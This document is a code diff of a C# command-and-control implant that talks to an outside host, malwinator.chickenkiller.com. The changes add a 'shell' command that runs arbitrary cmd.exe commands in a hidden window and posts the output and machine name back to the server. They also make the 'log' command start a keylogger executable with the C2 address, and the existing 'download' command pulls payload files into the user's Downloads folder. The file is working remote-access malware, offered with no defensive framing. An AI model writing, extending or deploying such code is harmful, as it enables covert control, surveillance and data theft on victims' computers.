@@ -1,4 +1,4 @@
-using System.Diagnostics;
+﻿using System.Diagnostics;
 
 namespace C2
 {
@@ -6,6 +6,8 @@ namespace C2
     {
         private static string requestResult = string.Empty;
         private static Uri url = new Uri("https://malwinator.chickenkiller.com");
+        //private static Uri url = new Uri("http://malwinator.chickenkiller.com");
+        //private static Uri url = new Uri("http://localhost:8088");
         private static string machineName = Environment.MachineName;
         private static string username = Environment.UserName;
         private static string filePath = "C:\\Users\\" + username + "\\Downloads\\";
@@ -62,7 +64,7 @@ namespace C2
 
         static async void ManageCommand(string command)
         {
-            string[] args = command.Split(' ');
+            string[] args = command.Trim().Split(' ');
 
 
             switch (args[0])
@@ -75,24 +77,27 @@ namespace C2
                 case "download":
                     KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", args[1]);
 
-                    HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result;
-
-                    // Check if the request was successful
-                    if (response.IsSuccessStatusCode)
+                    using (HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result)
                     {
-                        // Save the file content to a local file
-                        using (FileStream fileStream = new FileStream(filePath + args[1], FileMode.Create))
+                        // Check if the request was successful
+                        if (response.IsSuccessStatusCode)
                         {
-                            await response.Content.CopyToAsync(fileStream);
+                            // Save the file content to a local file
+                            using (FileStream fileStream = new FileStream(filePath + args[1], FileMode.Create))
+                            {
+                                await response.Content.CopyToAsync(fileStream);
+                            }
+
+                            Console.WriteLine($"[+] File downloaded successfully: {filePath}");
+                        }
+                        else
+                        {
+                            // Display the status code and reason phrase
+                            Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
                         }
 
-                        Console.WriteLine($"[+] File downloaded successfully: {filePath}");
                     }
-                    else
-                    {
-                        // Display the status code and reason phrase
-                        Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
-                    }
+
                     break;
 
                 case "log":
@@ -102,7 +107,7 @@ namespace C2
                         return;
                     }
                     process.StartInfo.FileName = "C:\\Users\\" + username + "\\Downloads\\MyConsoleApp.exe"; // Path to the keylogger executable file
-                    process.StartInfo.Arguments = ""; // Command-line arguments
+                    process.StartInfo.Arguments = url.ToString(); // Command-line arguments
 
                     // Start the process
                     process.Start();
@@ -121,10 +126,52 @@ namespace C2
                     break;
 
 
+                case "shell":
+                    KeyValuePair<string, string> result = new KeyValuePair<string, string>("result", ExecuteCommand(string.Join(" ", args.Skip(1))));
+
+                    using (HttpResponseMessage response = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { result, machineNameFormData })).Result)
+                    {
+                        Console.WriteLine(response.Content.ToString());
+                    }
+
+                    Console.WriteLine("[+] Shell command sent! (" + string.Join(" ", args.Skip(1)) + ")");
+                    break;
+
                 default:
                     Console.WriteLine("[!] Command not recognized! (" + command + ")");
                     break;
             }
+        }
+
+        private static string ExecuteCommand(string command)
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",  
+                Arguments = $"/C \"{command}\"",  
+                RedirectStandardOutput = true, 
+                RedirectStandardError = true,
+                UseShellExecute = false,  
+                CreateNoWindow = true 
+            };
+
+            Process process = new Process
+            {
+                StartInfo = startInfo
+            };
+
+            process.Start();
+
+            string output = process.StandardOutput.ReadToEnd();
+            string err = process.StandardError.ReadToEnd();
+
+            process.WaitForExit();
+            int code = process.ExitCode;
+
+            if (code == 0)
+                return output;
+            else
+                return err;
         }
     }
 }
